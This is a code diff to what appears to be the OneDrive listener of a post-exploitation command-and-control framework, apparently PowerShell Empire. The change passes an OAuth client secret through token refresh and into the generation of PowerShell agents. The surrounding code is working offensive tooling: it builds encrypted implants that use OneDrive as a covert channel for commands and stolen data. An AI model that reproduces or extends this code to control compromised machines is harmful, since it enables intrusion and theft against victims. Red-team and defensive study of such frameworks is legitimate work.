@@ -332,7 +332,7 @@ class Listener:
         else:
             print helpers.color("[!] Python agent not available for Onedrive")
 
-    def generate_comms(self, listener_options, client_id, token, refresh_token, redirect_uri, language=None):
+    def generate_comms(self, listener_options, client_id, client_secret, token, refresh_token, redirect_uri, language=None):
 
         staging_key = listener_options['StagingKey']['Value']
         base_folder = listener_options['BaseFolder']['Value']
@@ -357,6 +357,7 @@ class Listener:
         if((Get-Date) -gt $Script:TokenObject.expires) {
             $data = New-Object System.Collections.Specialized.NameValueCollection
             $data.add("client_id", "%s")
+            $data.add("client_secret", "%s")
             $data.add("grant_type", "refresh_token")
             $data.add("scope", "files.readwrite offline_access")
             $data.add("refresh_token", $Script:TokenObject.refresh)
@@ -373,7 +374,7 @@ class Listener:
         $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}
         $wc
     }
-            """ % (token, refresh_token, client_id, redirect_uri)
+            """ % (token, refresh_token, client_id, client_secret, redirect_uri)
 
             post_message = """
     $script:SendMessage = {
@@ -447,7 +448,7 @@ class Listener:
 
             return token_manager + post_message + get_message
 
-    def generate_agent(self, listener_options, client_id, token, refresh_token, redirect_uri, language=None):
+    def generate_agent(self, listener_options, client_id, client_secret, token, refresh_token, redirect_uri, language=None):
         """
         Generate the agent code
         """
@@ -470,7 +471,7 @@ class Listener:
             agent_code = f.read()
             f.close()
 
-            comms_code = self.generate_comms(listener_options, client_id, token, refresh_token, redirect_uri, language)
+            comms_code = self.generate_comms(listener_options, client_id, client_secret, token, refresh_token, redirect_uri, language)
             agent_code = agent_code.replace("REPLACE_COMMS", comms_code)
 
             agent_code = helpers.strip_powershell_comments(agent_code)
@@ -652,7 +653,7 @@ class Listener:
             time.sleep(int(poll_interval))
             try: #Wrap the whole loop in a try/catch so one error won't kill the listener
                 if time.time() > token['expires_at']: #Get a new token if the current one has expired
-                    token = renew_token(client_id, token['refresh_token'])
+                    token = renew_token(client_id, client_secret, token['refresh_token'])
                     s.headers['Authorization'] = "Bearer " + token['access_token']
                     message = "[*] Refreshed auth token"
                     signal = json.dumps({
@@ -707,8 +708,8 @@ class Listener:
                             lang, return_val = self.mainMenu.agents.handle_agent_data(staging_key, content, listener_options)[0]
 
                             session_key = self.mainMenu.agents.agents[agent_name]['sessionKey']
-                            agent_token = renew_token(client_id, token['refresh_token']) #Get auth and refresh tokens for the agent to use
-                            agent_code = str(self.generate_agent(listener_options, client_id, agent_token['access_token'],
+                            agent_token = renew_token(client_id, client_secret, token['refresh_token']) #Get auth and refresh tokens for the agent to use
+                            agent_code = str(self.generate_agent(listener_options, client_id, client_secret, agent_token['access_token'],
                                                             agent_token['refresh_token'], redirect_uri, lang))
                             enc_code = encryption.aes_encrypt_then_hmac(session_key, agent_code)
 
